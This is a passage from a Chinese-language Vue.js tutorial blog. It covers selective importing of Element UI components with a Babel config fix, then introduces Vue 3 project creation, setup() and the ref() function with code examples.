<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="全量引入使用"><a href="#全量引入使用" class="headerlink" title="全量引入使用"></a>全量引入使用</h4><p>直接使用</p>
<p>看文档上哪个适合用的，复制然后改吧改吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot;&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-button&gt;默认按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot;&gt;主要按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;success&quot;&gt;成功按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;info&quot;&gt;信息按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;warning&quot;&gt;警告按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;danger&quot;&gt;危险按钮&lt;/el-button&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606161429566.png" alt="image-20220606161429566"></p>
<h4 id="按需引入使用"><a href="#按需引入使用" class="headerlink" title="按需引入使用"></a>按需引入使用</h4><p>接下来，如果你只希望引入部分组件，那么需要在 <code>main.js</code> 中写入以下内容：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">Row</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>; <span class="comment">// 注意引入的时候，是没有`el`的，然后第一个字母大写</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="title class_">Button</span>.<span class="property">name</span>, <span class="title class_">Button</span>);  <span class="comment">// 第一个参数，就是自定义的一个名称</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="title class_">Row</span>.<span class="property">name</span>, <span class="title class_">Row</span>);</span><br><span class="line"><span class="comment">// 那么样式怎么把控呢？</span></span><br><span class="line"><span class="comment">// element会根据引入的组件库，自己分析依赖的样式</span></span><br><span class="line"><span class="comment">// Vue.use(Button)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>值得注意的是，组件库的配置和脚手架的配置要合并起来的，如果脚手架更新了，但组件库的配置写法没更新，就会有问题</p>
<p>很明显的一个例子就是，<code>.babelrc</code>文件都换成了<code>babel.config.js</code></p>
<p>如上写法，会提示如下错误：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606155724194.png" alt="image-20220606155724194"></p>
<p>按照提示，安装下对应的包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i babel-preset-es2015 -D</span><br></pre></td></tr></table></figure>

<p>虽然安装成功了，但人家<code>babel-preset-es2015</code>更新改名了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-12-centos test2]<span class="comment"># npm i babel-preset-es2015 -D</span></span><br><span class="line">npm WARN deprecated babel-preset-es2015@6.24.1: 🙌  Thanks <span class="keyword">for</span> using Babel: we recommend using babel-preset-env now: please <span class="built_in">read</span> https://babeljs.io/env to update!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再重新启动下项目，报如下错误</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606160147715.png" alt="image-20220606160147715"></p>
<p>由于人家<code>es2015</code>改名了，所以配置文件得修改：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    <span class="string">&#x27;@vue/cli-plugin-babel/preset&#x27;</span>,</span><br><span class="line">    [<span class="string">&quot;@babel/preset-env&quot;</span>, &#123; <span class="string">&quot;modules&quot;</span>: <span class="literal">false</span> &#125;] <span class="comment">// 更正一下包名</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;component&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;libraryName&quot;</span>: <span class="string">&quot;element-ui&quot;</span>,</span><br><span class="line">        <span class="string">&quot;styleLibraryName&quot;</span>: <span class="string">&quot;theme-chalk&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>造成这些问题的原因在于，<code>element</code>没有及时更新</p>
<p>如果不说怎么改，要真想解决这个问题，需要研究下<code>babel-plugin-component</code>文档，看看目前针对最新的脚手架，它的配置是怎么样的</p>
<p>按需引入后的资源大小</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220606160818450.png" alt="image-20220606160818450"></p>
<h1 id="8-Vue3"><a href="#8-Vue3" class="headerlink" title="8.Vue3"></a>8.<code>Vue3</code></h1><h2 id="8-1-Vue3快速上手"><a href="#8-1-Vue3快速上手" class="headerlink" title="8.1.Vue3快速上手"></a>8.1.<code>Vue3</code>快速上手</h2><h3 id="8-1-1-Vue3简介"><a href="#8-1-1-Vue3简介" class="headerlink" title="8.1.1.Vue3简介"></a>8.1.1.<code>Vue3</code>简介</h3><ul>
<li>2020年9月18日，<code>Vue.js</code>发布3.0版本，代号：<code>One Piece</code>（海贼王）</li>
<li>耗时2年多，<span style="color:red">2600+次提交、<a target="_blank" rel="noopener" href="https://github.com/vuejs/rfcs">30+个RFC</a>、600+次PR、99位贡献者</span></li>
<li><code>github</code>上的<code>tags</code>地址：<a target="_blank" rel="noopener" href="https://github.com/vuejs/core/tree/v3.2.36">https://github.com/vuejs/core/tree/v3.2.36</a></li>
</ul>
<h3 id="8-1-2-Vue3带来了什么"><a href="#8-1-2-Vue3带来了什么" class="headerlink" title="8.1.2.Vue3带来了什么"></a>8.1.2.<code>Vue3</code>带来了什么</h3><h4 id="8-1-2-1-性能的提升"><a href="#8-1-2-1-性能的提升" class="headerlink" title="8.1.2.1.性能的提升"></a>8.1.2.1.性能的提升</h4><ul>
<li>打包大小减少<code>41%</code></li>
<li>初次渲染快<code>55%</code>，更新渲染快<code>133%</code></li>
<li>内存减少<code>54%</code></li>
<li>…</li>
</ul>
<h4 id="8-1-2-2-源码的升级"><a href="#8-1-2-2-源码的升级" class="headerlink" title="8.1.2.2.源码的升级"></a>8.1.2.2.源码的升级</h4><ul>
<li>使用<code>Proxy</code>代替<code>defineProperty</code>实现响应式</li>
<li>重写虚拟<code>dom</code>的实现和<code>tree-shaking</code></li>
<li>…</li>
</ul>
<h4 id="8-1-2-3-拥抱TypeScript"><a href="#8-1-2-3-拥抱TypeScript" class="headerlink" title="8.1.2.3.拥抱TypeScript"></a>8.1.2.3.拥抱<code>TypeScript</code></h4><ul>
<li><code>Vue3</code>可以更好的支持<code>tree-shaking</code></li>
</ul>
<h4 id="8-1-2-4-新特性"><a href="#8-1-2-4-新特性" class="headerlink" title="8.1.2.4.新特性"></a>8.1.2.4.新特性</h4><ul>
<li><code>Composition API</code>（组合式<code>API</code>）<ul>
<li><code>setup</code>配置</li>
<li><code>ref</code>和<code>reactive</code></li>
<li><code>watch</code>和<code>watchEffect</code></li>
<li><code>provide</code>和<code>inject</code></li>
<li>…</li>
</ul>
</li>
<li>新的内置组件<ul>
<li><code>Fragment</code></li>
<li><code>Teleport</code></li>
<li><code>Suspense</code></li>
</ul>
</li>
<li>其他改变<ul>
<li>新的生命周期钩子</li>
<li><code>data</code>选项应始终被声明为一个函数</li>
<li>移除<code>keyCode</code>支持作为<code>v-on</code>的修饰符</li>
<li>…</li>
</ul>
</li>
</ul>
<h2 id="8-2-创建Vue3工程"><a href="#8-2-创建Vue3工程" class="headerlink" title="8.2.创建Vue3工程"></a>8.2.创建<code>Vue3</code>工程</h2><h3 id="8-2-1-使用vue-cli创建"><a href="#8-2-1-使用vue-cli创建" class="headerlink" title="8.2.1.使用vue-cli创建"></a>8.2.1.使用<code>vue-cli</code>创建</h3><p>官方文档：<a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create">https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上</span></span><br><span class="line">vue --version</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">vue -V</span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装或升级@vue/cli</span></span><br><span class="line">npm install @vue/cli -g</span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line">npm install @vue/cli -D</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建</span></span><br><span class="line">vue create vue3_project</span><br><span class="line"><span class="comment">## 或者</span></span><br><span class="line">npx vue create vue3_project</span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line"><span class="built_in">cd</span> vue_project3</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>



<h3 id="8-2-2-使用vite创建"><a href="#8-2-2-使用vite创建" class="headerlink" title="8.2.2.使用vite创建"></a>8.2.2.使用<code>vite</code>创建</h3><p>官方文档：<a target="_blank" rel="noopener" href="https://v3.cn.vuejs.org/guide/installation.html#vite">https://v3.cn.vuejs.org/guide/installation.html#vite</a></p>
<p>什么是<code>vite</code>？新一代前端构建工具</p>
<p>优势：</p>
<ul>
<li><p>开发环境中，无需打包操作，可快速的冷启动</p>
</li>
<li><p>轻量快速的热重载（<code>HMR</code>）</p>
</li>
<li><p>真正的按需编译，不再等待整个应用编译完成</p>
</li>
<li><p>传统构建与<code>vite</code>构建对比图</p>
<img src="https://vitejs.cn/assets/bundler.37740380.png" alt="基于打包器的开发服务器" style="zoom:30%;" />

<img src="esm.3070012d.png" alt="基于 ESM 的开发服务器" style="zoom:35%;" /></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm 6.x</span></span><br><span class="line">npm init vite@latest my-vue-app --template vue</span><br><span class="line"></span><br><span class="line"><span class="comment"># npm 7+, 需要额外的双横线：</span></span><br><span class="line">npm init vite@latest my-vue-app -- --template vue</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> my-vue-app</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-2-3-分析工程结构"><a href="#8-2-3-分析工程结构" class="headerlink" title="8.2.3.分析工程结构"></a>8.2.3.分析工程结构</h3><p>分析的是<code>vue-cli</code>方式创建的目录结构</p>
<h4 id="src-main-js"><a href="#src-main-js" class="headerlink" title="src/main.js"></a><code>src/main.js</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>import &#123; createApp &#125; from &#39;vue&#39;</code></p>
<ul>
<li>引入的不再是<code>Vue</code>构造函数了，而是一个名为<code>createApp</code>的工厂函数（无需通过<code>new</code>关键字调用）</li>
</ul>
</li>
<li><p><code>createApp(App).mount(&#39;#app&#39;)</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(app)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建应用实例对象，<code>app</code>类似于<code>vue2</code>中的<code>vm</code>，但<code>app</code>比<code>vm</code>更轻</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607054736154.png" alt="image-20220607054736154"></p>
</li>
<li><p>注意，并不兼容之前的<code>new Vue</code>的写法，<code>import Vue from &#39;vue&#39;</code>时，<code>Vue</code>时<code>undefined</code></p>
</li>
</ul>
</li>
</ul>
<h4 id="App-vue-1"><a href="#App-vue-1" class="headerlink" title="App.vue"></a><code>App.vue</code></h4><ul>
<li><code>template</code>中可以没有根标签</li>
</ul>
<h3 id="8-2-4-安装vue3对应的开发者工具"><a href="#8-2-4-安装vue3对应的开发者工具" class="headerlink" title="8.2.4.安装vue3对应的开发者工具"></a>8.2.4.安装<code>vue3</code>对应的开发者工具</h3><p>直接去官网：<a target="_blank" rel="noopener" href="https://devtools.vuejs.org/guide/installation.html">https://devtools.vuejs.org/guide/installation.html</a></p>
<h2 id="8-3-常用Composition-API"><a href="#8-3-常用Composition-API" class="headerlink" title="8.3.常用Composition API"></a>8.3.常用<code>Composition API</code></h2><p>官方文档：</p>
<h3 id="8-3-1-拉开序幕的setup"><a href="#8-3-1-拉开序幕的setup" class="headerlink" title="8.3.1.拉开序幕的setup"></a>8.3.1.拉开序幕的<code>setup</code></h3><ul>
<li><p>理解：<code>Vue3</code>中的一个新的配置项，值为一个函数</p>
</li>
<li><p><code>setup</code>是所有<code>Composition API</code>（组合<code>API</code>）表演的舞台</p>
</li>
<li><p>组件中所用到的：数据，方法等等，均要配置在<code>setup</code>中</p>
</li>
<li><p><code>setup</code>函数的两种返回值</p>
<ul>
<li><p>若返回一个对象，则对象中的属性、方法，在模板中均可以直接使用。（重点关注）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是App组件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名： &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名： &#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sayHello&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		<span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			<span class="keyword">let</span> name = <span class="string">&#x27;sai&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			<span class="keyword">let</span> age = <span class="number">18</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			<span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">				<span class="title function_">alert</span>(<span class="string">`你好呀，<span class="subst">$&#123;name&#125;</span>,今年我<span class="subst">$&#123;age&#125;</span>岁了`</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			<span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">				name,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">				age,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">				sayHello</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">			&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">		&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607064823164.png" alt="image-20220607064823164"></p>
</li>
<li><p>若返回一个渲染函数，则可以自定义渲染内容（了解）</p>
<ul>
<li>模板里的内容会被渲染函数的返回内容覆盖</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;!-- 内容会被覆盖 --&gt;</span><br><span class="line">	&lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;h&#125; from &#x27;vue&#x27;</span><br><span class="line">	export default &#123;</span><br><span class="line">		name: &#x27;App&#x27;,</span><br><span class="line">		setup() &#123;</span><br><span class="line">			// return () =&gt; &#123;</span><br><span class="line">			// 	return h(&#x27;h1&#x27;, &#x27;sai&#x27;)</span><br><span class="line">			// &#125;</span><br><span class="line"></span><br><span class="line">			// 简写</span><br><span class="line">			return () =&gt; h(&#x27;h1&#x27;, &#x27;sai&#x27;)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>注意点：</p>
<ul>
<li>尽量不要和<code>vue2.x</code>配置混用<ul>
<li><code>vue2.x</code>配置（<code>data</code>、<code>methods</code>、<code>computed</code>…）中可以访问到<code>setup</code>中的属性和方法</li>
<li>但在<code>setup</code>中不能访问到<code>vue2.x</code>配置（<code>data</code>、<code>methods</code>、<code>computed</code>…）</li>
<li>如果有重名，<code>setup</code>优先</li>
</ul>
</li>
<li><code>setup</code>不能是一个<code>async</code>函数，因为返回值不再是<code>return</code>的对象，而是<code>promise</code>，模板中看不到对象中的属性（后期学到了<code>Suspence</code>，其实是可以的）</li>
</ul>
</li>
</ul>
<h3 id="8-3-2-ref函数"><a href="#8-3-2-ref函数" class="headerlink" title="8.3.2.ref函数"></a>8.3.2.<code>ref</code>函数</h3><p><code>vue2</code>中的<code>ref</code>是一个标签属性，<code>vue3</code>中多了一个同名的函数</p>
<h4 id="8-3-2-1ref函数处理基本数据类型"><a href="#8-3-2-1ref函数处理基本数据类型" class="headerlink" title="8.3.2.1ref函数处理基本数据类型"></a>8.3.2.1<code>ref</code>函数处理基本数据类型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let name = &#x27;sai&#x27;</span><br><span class="line">    let age = 18</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      name = &#x27;sai_change&#x27;</span><br><span class="line">      age = 19</span><br><span class="line">      console.log(name, age)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      name,</span><br><span class="line">      age,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个案例中，我们修改了数据，但是页面上并没有更新</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607090829602.png" alt="image-20220607090829602"></p>
<p>因为<code>vue</code>并没有监视到数据的变化，上述方式定义的数据并不是响应式数据</p>
<p>如何把普通的数据，变成一个能被<code>vue</code>监测到的响应式数据呢？</p>
<p>借助<code>ref</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let name = ref(&#x27;sai&#x27;)</span><br><span class="line">    let age = ref(18)</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      name = &#x27;sai_change&#x27;</span><br><span class="line">      age = 19</span><br><span class="line">      console.log(name, age)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      name,</span><br><span class="line">      age,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>那么直接能这样改吗？不能！！！上述代码执行后，点击修改按钮页面仍然没有变化</p>
<p>为啥咧？因为我们改的地方不对！！</p>
<p>我们先注释掉修改的两行代码，直接打印被<code>ref</code>包裹的<code>name</code>和<code>age</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607092144979.png" alt="image-20220607092144979"></p>
<ul>
<li><p><code>RefImpl</code>：<code>Refenrence Implement</code>（引用的实现），表示一个引用实现对象</p>
</li>
<li><p><code>RefImpl</code>对象也是通过<code>Object.defineProperty</code>实现数据响应式的</p>
<ul>
<li>类比于<code>vue2</code>的<code>_data</code>身上的属性，为了便于读写，给了<code>vm</code>一份属性</li>
<li><code>RefImpl</code>对象的原型对象上定义着<code>getter</code>和<code>setter</code>，然后又给了<code>RefImpl</code>对象一份属性</li>
</ul>
</li>
<li><p>读写数据会根据原型链查找<code>getter</code>和<code>setter</code></p>
<ul>
<li><p>读数据</p>
